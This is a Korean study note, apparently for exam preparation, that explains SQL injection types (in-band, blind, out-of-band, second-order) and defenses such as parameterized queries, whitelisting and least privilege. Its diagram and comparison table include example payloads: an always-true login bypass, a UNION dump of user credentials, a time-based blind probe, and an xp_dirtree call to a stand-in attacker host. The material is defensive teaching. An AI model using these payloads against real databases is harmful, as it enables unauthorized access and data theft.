---
title: "SQL Injection (SQL: Structured Query Language)"
author: "Antigravity"
date: "2026-10-01T23:50:00+09:00"
tags:
  - "notes-security"
sidebar:
  badge:
    text: "응용"
extra:
  keyword_grade: "응용"
  model: "Gemini 3.8 Flash"
---

## Ⅰ. SQL Injection의 개요

- 개념 : 웹 애플리케이션의 입력값 검증 부실을 악용하여 악의적인 **SQL(Structured Query Language) 구문** (Query)을 삽입·실행시킴으로써 백엔드 데이터베이스를 비정상적으로 조작, 데이터 무단 열람, 원장 변조, 관리자 권한 획득, 나아가 OS(Operating System) 시스템 명령까지 실행하는 대표적인 웹 애플리케이션 인젝션 공격.
- 배경 및 필요성 : 동적 웹 애플리케이션이 확산되면서 사용자 입력을 **문자열 결합** (String Concatenation) 방식으로 SQL 쿼리에 그대로 포함시키는 부실한 개발 관행이 지속되었으며, **OWASP(Open Worldwide Application Security Project) Top 10**에서 오랫동안 최상위권 취약점으로 군림함.
- 핵심 목적 : 데이터베이스 내의 개인정보, 금융 데이터 등 기밀을 대량 유출하고, 인증 절차를 우회하며, DB(Database) 서버의 **저장 프로시저** (xp_cmdshell 등)를 호출하여 서버 제어권 장악.

## Ⅱ. SQL Injection의 핵심 아키텍처 및 동작 메커니즘

SQL Injection은 공격 메커니즘과 정보 획득 방식에 따라 인밴드(In-band: Error/Union), 추론(Inferential/Blind: Boolean/Time), 아웃오브밴드(Out-of-band: DNS/HTTP)로 분류됨.

```text
[ SQL Injection 유형별 공격 메커니즘 및 침투 경로 ]

  [ 공격자 (브라우저 / 자동화 도구) ]
       |
       v (1) 악성 페이로드 주입 (예: ' OR '1'='1' -- )
  +-------------------------------------------------------------+
  | 웹 애플리케이션 (WAS) : 문자열 결합 취약 코드                |
  | "SELECT * FROM users WHERE id='" + input + "' AND pw=..."   |
  +------------------------------+------------------------------+
                                 | (2) 조작된 SQL 실행
                                 v
  +-------------------------------------------------------------+
  |              데이터베이스 관리 시스템 (DBMS)                |
  |  실제 실행 쿼리:                                            |
  |  SELECT * FROM users WHERE id='' OR '1'='1' -- ' AND pw=... |
  |  -> WHERE 조건이 항상 참(True)이 되어 전 테이블 반환!       |
  +------------------------------+------------------------------+
                                 |
         +-----------------------+-----------------------+
         |                                               |
 [ 1. 인밴드 (In-Band) ]                         [ 2. 블라인드 (Blind) ]
 * Error-based: DB 에러 메시지에 민감정보 노출   * Boolean-based: 참/거짓 웹 응답 대조
 * Union-based: 타 테이블 결합(UNION SELECT)     * Time-based: SLEEP() 지연 시간 측정
         |                                               |
         v                                               v
 [ 3. 아웃오브밴드 (Out-of-Band) ]               [ 최종 피해 ]
 * DNS 룩업을 통해 공격자 서버로 데이터 유출     * 개인정보 수천만 건 탈취, 관리자 우회
 * (xp_dirtree / UTL_HTTP / LOAD_FILE)           * OS 명령 실행 (xp_cmdshell) 시스템 장악
```

- **인밴드 SQL 인젝션(In-band SQLi)** : 공격을 요청한 동일 채널을 통해 결과를 직접 확인하는 방식으로, UNION 연산자로 타 테이블을 결합하는 Union-based와 문법 에러 메시지에 테이블명을 노출시키는 Error-based가 있음.
- **블라인드 SQL 인젝션(Blind SQLi)** : 서버가 에러 메시지나 쿼리 결과를 화면에 출력하지 않을 때, 참/거짓에 따른 HTTP(Hypertext Transfer Protocol) 응답 차이(Boolean-based)나 SLEEP(5) 등 DBMS(Database Management System) 지연 시간(Time-based)을 한 글자씩 측정하여 DB를 전수 덤프.
- **아웃오브밴드(Out-of-band: OOB)** : 대량의 데이터 유출이나 방화벽 제약을 극복하기 위해 DBMS의 네트워크 기능(DNS(Domain Name System) 질의, SMB, HTTP 요청)을 트리거하여 공격자 소유의 외부 서버로 데이터를 역송신.
- **2차 SQL 인젝션(Second-Order SQLi)** : 악성 페이로드가 입력 시점에는 실행되지 않고 DB에 안전하게 저장되었다가, 이후 다른 관리자 배치 프로세스나 쿼리에서 호출될 때 실행되는 지연형 공격.

## Ⅲ. SQL Injection의 세부 구성 요소 및 비교 분석

| 비교 항목 | **인밴드** (Union / Error) | **추론형** (Blind: Time/Boolean) | **아웃오브밴드** (OOB) |
| --- | --- | --- | --- |
| 결과 확인 채널 | 요청한 HTTP 응답 본문에 직접 출력 | HTTP 응답 코드, 컨텐츠 크기, 지연시간 | 공격자가 구축한 외부 DNS/웹 서버 |
| 공격 속도 | 극도로 빠름 (수초 내 전 테이블 유출) | 매우 느림 (비트 단위 추론 질의 반복) | 빠름 (비동기 대량 패킷 전송) |
| 탐지 난이도 | 쉬움 (WAF(Web Application Firewall) 시그니처 및 에러 모니터링) | 어려움 (정상 URL(Uniform Resource Locator) 파라미터와 유사) | 어려움 (아웃바운드 DNS 쿼리 은닉) |
| 필요 전제 조건 | 화면에 쿼리 결과나 에러 메시지 렌더링 | 참/거짓에 따른 미세한 시스템 응답 변화 | DBMS의 외부 네트워크 통신 권한 개방 |
| 주요 페이로드 | ' UNION SELECT null, id, pw FROM users-- | 1' AND IF(ascii(substr(db,1,1))=97,sleep(5),0)-- | '; EXEC master..xp_dirtree '\\attacker.com\a'-- |

- SQL 인젝션은 가장 파괴적인 웹 취약점이나, 원천적인 방어책인 **정적 매개변수화** (PreparedStatement)를 코드 작성 단계에 철저히 적용하면 효과적으로 방어 가능함.

## Ⅳ. SQL Injection의 주요 한계점 및 해결 방안

- 단순 특수문자 블랙리스트 필터링의 우회 취약성 :
  - 한계점 : 공백 문자 대신 주석(`/**/`) 사용, URL 다중 인코딩, 대소문자 혼합(uNiOn), 16진수 변환 등 공격자의 정교한 난독화 기법으로 정규식 필터 무력화.
  - 해결 방안 : 블랙리스트 필터링을 전면 폐기하고, SQL 구문과 데이터를 엄격히 분리하는 매개변수화 쿼리(Parameterized Query) 및 ORM(JPA, Java Persistence API) 전면 도입.
- 동적 테이블명 및 정렬(ORDER BY) 구문의 바인딩 파라미터 미지원 :
  - 한계점 : PreparedStatement는 컬럼 값(Literal)만 바인딩 가능하며, 동적 컬럼명이나 'ORDER BY asc/desc' 구문은 파라미터 처리가 불가하여 문자열 결합 유혹 발생.
  - 해결 방안 : 입력값을 엄격한 화이트리스트(허용된 정렬 필드명 매핑 배열)로 검증하고 일치하지 않을 경우 기본 정렬로 강제 치환.
- 대규모 레거시 코드베이스의 전수 수정 공수 및 비용 :
  - 한계점 : 수백만 라인의 레거시 시스템에서 문자열 결합으로 작성된 취약한 DAO 코드를 일일이 찾아 수정하기 위한 인력과 일정 부족.
  - 해결 방안 : 정적 분석 도구(SAST: SonarQube)로 취약 포인트를 자동 식별하고, 코드 수정 전까지 WAF 가상 패치(Virtual Patching)와 RASP(Runtime Application Self-Protection) 솔루션을 과도기적으로 적용.

## Ⅴ. SQL Injection 적용 및 발전을 위한 기술사적 제언

- PreparedStatement 및 MyBatis '#{param}' 바인딩 표준 강제 : 문자열 치환 방식인 '${param}' 사용을 전사 정적 룰셋으로 영구 금지하고, 자동화된 CI/CD 파이프라인에서 프리커밋 빌드 실패 처리.
- 데이터베이스 최소 권한(Least Privilege) 원칙 적용 : 웹 애플리케이션의 DB 연결 계정에서 'DROP', 'ALTER', 'GRANT' 권한 및 시스템 저장 프로시저(xp_cmdshell) 실행 권한을 원천 박탈.
- DBMS 에러 메시지 사용자 노출 차단 (Custom Error Page) : DB 쿼리 실패 시 상세한 데이터베이스 에러 로그를 클라이언트 화면에 절대 노출하지 않고 포괄적인 안내 페이지로 대체하여 정보 노출 방지.
